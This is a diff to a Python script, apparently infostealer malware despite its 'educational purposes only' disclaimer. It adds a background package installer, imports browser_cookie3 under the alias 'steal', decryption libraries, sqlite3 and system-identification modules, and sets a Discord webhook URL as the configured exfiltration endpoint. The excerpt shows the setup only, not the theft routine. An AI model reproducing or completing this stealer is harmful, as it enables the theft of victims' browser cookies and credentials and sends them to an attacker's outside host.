@@ -1,6 +1,4 @@
 # WARN: This one is for educational purposes only! I do not recommend using it on people
-
-
 import subprocess
 import sys
 import threading
@@ -34,7 +32,34 @@ def install_packages_background(packages):
 # Start installation in the background
 threading.Thread(target=install_packages_background, args=(required_packages,), daemon=True).start()
 
-# --- MAIN SCRIPT CAN RUN IMMEDIATELY ---
+
+
+import psutil
+import platform
+import json
+from datetime import datetime
+from time import sleep
+import requests
+import socket
+from requests import get
+import os
+import re
+import requests
+import subprocess
+from uuid import getnode as get_mac
+import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3
+from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.backends import default_backend
+from Crypto.Cipher import AES
+
+
+from base64 import b64decode, b64encode
+from dhooks import Webhook, Embed, File
+from subprocess import Popen, PIPE
+from json import loads, dumps
+from shutil import copyfile
+from sys import argv
 
 # CONFIG -> Setup before compiling
 url= "https://discord.com/api/webhooks/1491394773867561070/3BoH3T2a08A75JW37rljMNg47rJc2x4xmqWYa4ButGcBqbcljqaGGeSIIDGIFjD1xNq0" #Paste Discord Webhook url
